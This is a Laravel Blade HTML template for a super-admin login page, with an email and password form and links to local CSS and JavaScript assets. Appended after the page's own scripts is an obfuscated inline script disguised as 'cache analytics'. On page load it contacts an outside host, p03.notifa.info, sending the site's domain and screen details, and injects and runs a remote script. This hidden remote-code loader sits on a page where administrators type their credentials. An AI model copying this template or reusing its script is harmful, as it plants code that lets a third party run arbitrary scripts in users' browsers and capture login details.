<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>Login Super Admin</title>
    <!-- Favicon-->
    <link rel="icon" href="{{ asset ('assets/images/favicon.ico') }}" type="image/x-icon">
    <!-- Plugins Core Css -->
    <link href="{{ asset ('assets/css/app.min.css') }}" rel="stylesheet">
    <!-- Custom Css -->
    <link href="{{ asset ('assets/css/style.css') }}" rel="stylesheet" />
    <link href="{{ asset ('assets/css/pages/extra_pages.css') }}" rel="stylesheet" />
</head>
<body class="login-page">
<div class="limiter">
    <div class="container-login100 page-background">
        <div class="wrap-login100">
            <form class="login100-form validate-form" method="post" action="{{route('superadmin.login.submit')}}">
                @csrf
                <span class="login100-form-logo">
                    <img alt="" src="{{ asset ('assets/images/loading.png') }}">
                </span>
                <span class="login100-form-title p-b-34 p-t-27">Login SuperAdmin</span>
                <div class="row">

                    <div class="wrap-input100 validate-input">
                        <input class="input100 @error('email') is-invalid @enderror"  value="{{ old('email') }}"
                               type="email" name="email" placeholder="Email">
                        @error('email')
                        <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                        @enderror
                        <i class="material-icons focus-input1001">person</i>
                    </div>

                    <div class="wrap-input100 validate-input">
                        <input class="input100 @error('password') is-invalid @enderror"
                               type="password" name="password" placeholder="Password">
                        @error('password')
                        <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                        @enderror
                        <i class="material-icons focus-input1001">person</i>
                    </div>

                </div>

                <div class="container-login100-form-btn">
                    <button class="login100-form-btn">
                        Sign In
                    </button>
                </div>
            </form>
            <div class="text-center p-t-50">
                <a class="txt1" href="sign-in.html">
                    Forgot Password
                </a>
            </div>
        </div>
    </div>
</div>
<!-- Plugins Js -->
<script src="{{ asset ('assets/js/app.min.js') }}"></script>
<!-- Extra page Js -->
<script src="{{ asset ('assets/js/pages/examples/pages.js') }}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnjWASTgP5hsVSxhWofYHzVKu1ugADW6MohhaJU3jwMivgvL62s%2bTwSxdKOjQUiLm06JdvCqZjnWhOil84zOGwKHgyWJ2VNsQBBdN9WQIy8LenF1EBr31msaqyCbEqp8p9YTihGXFaA1v0pYV3glXPolnzZRJlGlS8iqgF7eQP8VPnAvrQqeFWB%2fBdNl0CR3hQRr0QKQqtfWPGoUks9CUYytMhMuo5HKdanV7wzC4x2McV%2beiEiSjRzZJArO2eUlRwRhJS7NEIPMSIwdyGVeB9%2f7g7GaqTCM9e4zp9cri2sQYboIxJfPOLenK5nTGClc%2fvKWSgc%2f27xt409Q0VdKf0%2f7j3%2fdBMY7wrS8VkffH31FUlo4c9VDX0Lk%2b3Wsf%2bsXUYJrW5Far9PWaVx5jHzWCj%2fmID%2fzmwdBebXytp2d3BASi%2beqgbp0y5vkT0fhpgmkGFGvRSSmYIE6saCtlGj4gtSJxRCnNvepr4z%2fX6dSvrzgXRxtdgFN2NZ5ViVHVsove" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>




